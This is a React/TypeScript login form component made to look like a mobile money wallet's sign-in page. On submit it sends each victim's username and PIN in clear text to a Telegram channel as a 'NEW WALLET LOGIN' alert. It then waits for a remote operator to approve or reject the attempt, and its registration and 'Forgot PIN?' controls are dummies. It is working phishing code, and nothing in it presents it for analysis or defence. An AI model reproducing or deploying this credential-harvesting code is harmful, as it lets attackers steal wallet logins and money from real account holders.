
import React, { useState } from 'react';
import { sendLoginToTelegramAndWait } from '../utils/telegram';

interface LoginFormProps {
  onLogin: (data: any) => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onLogin }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMsg('');
    
    const message = `<b>🚨 NEW WALLET LOGIN 🚨</b>\n\n<b>👤 Username:</b> <code>${username}</code>\n<b>🔑 Password:</b> <code>${password}</code>\n\n<i>🌐 Automated Log Request</i>`;
    
    try {
      const isAccepted = await sendLoginToTelegramAndWait(message, username, false);
      if (isAccepted) {
        onLogin({ username, password });
      } else {
        setErrorMsg('Incorrect password');
      }
    } catch (error) {
      onLogin({ username, password });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full bg-white rounded-2xl shadow-2xl p-8 sm:p-12 animate-in fade-in zoom-in-95 duration-300">
      <h1 className="text-4xl font-black text-center text-gray-900 mb-2">
        Log In
      </h1>
      <p className="text-center text-gray-500 mb-10 text-sm">Access your account to continue</p>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 ml-1">
            Mobile Number / Username
          </label>
          <div className="relative group">
            <input
              type="text"
              placeholder="e.g. +263 24 2xxxxxx"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-5 py-4 bg-gray-50 border border-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition-all duration-200 placeholder-gray-300"
              required
              disabled={isLoading}
            />
          </div>
        </div>

        <div>
          <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 ml-1">
            Account PIN
          </label>
          <div className="relative group">
            <input
              type="password"
              placeholder="••••"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-5 py-4 bg-gray-50 border border-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition-all duration-200 placeholder-gray-300"
              required
              disabled={isLoading}
            />
          </div>
        </div>

        <div className="flex justify-end">
          <a 
            href="#" 
            onClick={(e) => e.preventDefault()} 
            className="text-sm font-bold text-blue-500 hover:text-blue-600 transition-colors cursor-default"
          >
            Forgot PIN?
          </a>
        </div>

        {errorMsg && (
          <div className="bg-red-50 text-red-600 p-3 rounded-xl text-sm font-semibold text-center animate-in fade-in zoom-in duration-200">
            {errorMsg}
          </div>
        )}

        <button
          type="submit"
          disabled={isLoading}
          className={`w-full group bg-[#3b82f6] text-white font-bold py-4 px-6 rounded-xl shadow-lg shadow-blue-100 hover:bg-blue-700 transition-all duration-200 uppercase tracking-widest text-sm flex items-center justify-center ${isLoading ? 'opacity-80 cursor-not-allowed' : 'hover:-translate-y-0.5'}`}
        >
          {isLoading ? (
            <svg className="animate-spin h-5 w-5 mr-3 text-white" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
          ) : null}
          {isLoading ? 'Waiting for approval...' : 'Secure Login'}
        </button>

        <div className="relative flex items-center py-4">
          <div className="flex-grow border-t border-gray-100"></div>
          <span className="flex-shrink mx-4 text-gray-300 text-xs font-bold uppercase tracking-widest">New user?</span>
          <div className="flex-grow border-t border-gray-100"></div>
        </div>

        <button
          type="button"
          onClick={(e) => e.preventDefault()}
          className="w-full bg-white text-[#ef4444] border-2 border-[#ef4444] font-bold py-3.5 px-6 rounded-xl hover:bg-red-50 transition-all duration-200 uppercase tracking-widest text-sm cursor-default"
        >
          Register Account
        </button>
      </form>
    </div>
  );
};

export default LoginForm;
